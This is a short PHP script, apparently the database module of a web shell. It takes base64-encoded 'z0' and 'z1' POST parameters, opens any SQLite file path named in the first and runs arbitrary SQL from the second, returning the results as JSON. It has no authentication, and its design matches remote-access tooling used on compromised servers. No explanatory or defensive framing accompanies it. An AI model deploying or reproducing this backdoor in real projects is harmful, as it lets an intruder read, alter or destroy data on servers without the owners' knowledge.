<?php

header('Content-Type: application/json');

$conn_str = base64_decode($_POST['z0']);
$sql = base64_decode($_POST['z1']);

function parse_conn($str) {
    $out = [];

    foreach (explode(';', $str) as $p) {
        if (strpos($p, '=') !== false) {
            [$k, $v] = explode('=', $p, 2);
            $out[trim($k)] = trim($v);
        }
    }

    return $out;
}

try {

    if (!extension_loaded('pdo_sqlite'))
        throw new Exception('Cannot find module "pdo_sqlite"');

    $cfg = parse_conn($conn_str);

    $db = $cfg['Database'] ?? $cfg['Data Source'] ?? $cfg['Source'] ?? '';
    
    if (!$db)
        throw new Exception('SQLite database path missing!');

    if (!file_exists($db))
        throw new Exception('SQLite database file not found: ' . $db);

    if (!is_readable($db))
        throw new Exception('SQLite database file is not readable: ' . $db);

    $pdo = new PDO('sqlite:' . $db);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

    if (!$sql) {
        echo json_encode([
            'success' => true,
            'message' => 'SQLite connection is OK'
        ]);

        exit;
    }

    $stmt = $pdo->query($sql);
    $rows = [];

    if ($stmt->columnCount() > 0) {
        while ($row = $stmt->fetch(PDO::FETCH_ASSOC)) {
            $rows[] = $row;
        }
    }

    echo json_encode([
        'success' => true,
        'rowCount' => count($rows),
        'data' => $rows
    ]);

    $pdo = null;

} catch (Exception $e) {
    echo json_encode([
        'success' => false,
        'error' => $e->getMessage()
    ]);
}

?>